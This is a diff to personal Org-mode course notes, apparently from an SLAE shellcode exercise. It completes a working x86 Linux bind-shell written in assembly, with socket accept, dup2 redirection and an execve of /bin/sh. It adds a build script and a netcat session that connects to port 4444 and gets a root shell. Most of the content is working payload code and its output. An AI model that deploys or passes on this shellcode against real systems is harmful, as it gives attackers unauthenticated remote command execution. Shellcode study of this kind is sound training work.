@@ -264,14 +264,14 @@ writing some assembly!
 
 Lets lookup some values of constants:
 
+#+BEGIN_SRC sh
 ~/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h~
+#+END_SRC
 
 #+Name: /usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h
 #+BEGIN_SRC c
 #define AF_INET		2	/* Internet IP Protocol 	*/
 #+END_SRC
-
-Find source..................
 
 #+Name: Find source
 #+BEGIN_SRC c
@@ -284,6 +284,7 @@ Find source..................
 #define INADDR_ANY ((unsigned long int) 0x00000000)
 #+END_SRC
 
+#+Name: bindshellasm.asm
 #+BEGIN_SRC asm
 global _start
 ;; Note: We will store 2 file descriptors along the way
@@ -361,6 +362,7 @@ section .text
     mov eax, 0x66 ; socketcall syscall
     xor ebx, ebx
     mov ebx, 0x5 ; sys_accept syscall number
+
     ;; Place accept's arguments on the stack
     ;; We don't need a peer socket???... so we
     ;; use nulls for addrlen and sockaddr struct
@@ -373,15 +375,61 @@ section .text
 
     ;; Save the returned connection socket file descriptor
     xor ebx, ebx
-    mov ebi, eax
+    mov ebx, eax
 
     ;; Call dup2 for stdin, stdout, and stderr in a loop
+    xor ecx, ecx
     mov cl, 0x2 ;loop counter
+
   dup2:
     mov al, 0x3f ;dup2
     int 0x80
     dec ecx
     jns dup2
 
+    ;; Call execve
+    xor eax, eax
+    mov al, 0xb ;execve
+    xor ebx, ebx
+    push ebx
+    push 0x68732f2f ;"sh//"
+    push 0x6e69622f ;"nib/"
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+
+#+END_SRC
+
+When we compile the above shellcode using the compile.sh script below:
+
+#+Name: compile assembly script
+#+BEGIN_SRC sh
+#!/bin/bash
+echo '[+] Assembling with Nasm ... '
+nasm -f elf32 -o $1.o $1.nasm
+
+echo '[+] Linking ...'
+ld -o $1 $1.o
+
+echo '[+] Done!'
+#+END_SRC
+
+~root@blahblah:~/shared/SLAE/slae/exercise1# ./compile.sh bindshellasm~
+
+And run the shellcode using:
+
+~root@blahblah:~/shared/SLAE/slae/exercise1# ./bindshellasm~
+
+And connect using netcat:
+
+#+Name: compile assembly script
+#+BEGIN_SRC sh
+
+#!/bin/bash
+root@blahblah:~/shared/SLAE/slae/exercise1# nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+id
+uid=0(root) gid=0(root) groups=0(root)
 
 #+END_SRC
